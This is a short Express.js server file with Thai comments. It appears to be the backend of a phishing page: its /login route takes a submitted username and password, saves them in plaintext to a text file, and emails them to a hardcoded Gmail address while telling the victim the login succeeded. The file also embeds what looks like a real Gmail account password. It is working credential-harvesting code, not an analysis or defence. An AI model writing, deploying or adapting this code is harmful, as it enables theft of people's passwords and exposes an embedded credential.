const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

app.use(bodyParser.json());

// เซิร์ฟเวอร์จะรับข้อมูลจากฟอร์มและบันทึกในไฟล์
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // สร้างไฟล์ .txt ที่เก็บชื่อและรหัส
    const content = `Username: ${username}\nPassword: ${password}\n`;

    fs.writeFile('login.txt', content, (err) => {
        if (err) {
            return res.status(500).json({ message: "Failed to create file" });
        }

        // ส่งไฟล์ไปยังอีเมล
        sendEmail(content);

        res.status(200).json({ message: 'Login successful! Your details have been saved.' });
    });
});

// ฟังก์ชันส่งอีเมล
function sendEmail(content) {
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'amongusggplay@gmail.com', // ใส่อีเมลของคุณ
            pass: '0987654321aww'   // ใส่รหัสผ่านอีเมลของคุณ
        }
    });

    const mailOptions = {
        from: 'your-email@gmail.com',
        to: 'amongusggplay@gmail.com',  // อีเมลที่ต้องการส่ง
        subject: 'Login Details',
        text: content,  // ข้อความที่จะส่งในอีเมล
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log('Error:', error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
}

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
